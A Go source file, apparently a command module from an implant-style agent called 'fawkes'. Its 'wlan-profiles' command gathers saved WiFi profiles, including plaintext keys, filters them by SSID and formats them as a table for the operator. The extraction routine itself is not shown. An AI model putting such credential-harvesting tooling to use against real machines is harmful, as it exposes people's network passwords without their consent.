package commands

import (
	"encoding/json"
	"fmt"
	"strings"

	"fawkes/pkg/structs"
)

// WlanProfilesCommand recovers saved WiFi network credentials
type WlanProfilesCommand struct{}

func (c *WlanProfilesCommand) Name() string { return "wlan-profiles" }
func (c *WlanProfilesCommand) Description() string {
	return "Recover saved WiFi network profiles and credentials"
}

type wlanProfilesArgs struct {
	Name string `json:"name"` // filter by SSID name (optional)
}

type wlanProfile struct {
	SSID     string `json:"ssid"`
	AuthType string `json:"auth_type"`
	Cipher   string `json:"cipher"`
	Key      string `json:"key"`
	Source   string `json:"source"`
}

func (c *WlanProfilesCommand) Execute(task structs.Task) structs.CommandResult {
	var args wlanProfilesArgs
	if task.Params != "" {
		_ = json.Unmarshal([]byte(task.Params), &args)
	}

	profiles, err := getWlanProfiles()
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Error: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Filter by name if specified
	if args.Name != "" {
		nameLower := strings.ToLower(args.Name)
		var filtered []wlanProfile
		for _, p := range profiles {
			if strings.Contains(strings.ToLower(p.SSID), nameLower) {
				filtered = append(filtered, p)
			}
		}
		profiles = filtered
	}

	if len(profiles) == 0 {
		return structs.CommandResult{
			Output:    "[*] No WiFi profiles found",
			Status:    "success",
			Completed: true,
		}
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("[*] %d WiFi profile(s)\n\n", len(profiles)))

	// Table header
	sb.WriteString(fmt.Sprintf("%-30s %-15s %-10s %-30s %s\n",
		"SSID", "Auth", "Cipher", "Key", "Source"))
	sb.WriteString(strings.Repeat("-", 100))
	sb.WriteString("\n")

	for _, p := range profiles {
		key := p.Key
		if key == "" {
			key = "(none/open)"
		}
		sb.WriteString(fmt.Sprintf("%-30s %-15s %-10s %-30s %s\n",
			truncStr(p.SSID, 30),
			truncStr(p.AuthType, 15),
			truncStr(p.Cipher, 10),
			truncStr(key, 30),
			p.Source))
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}
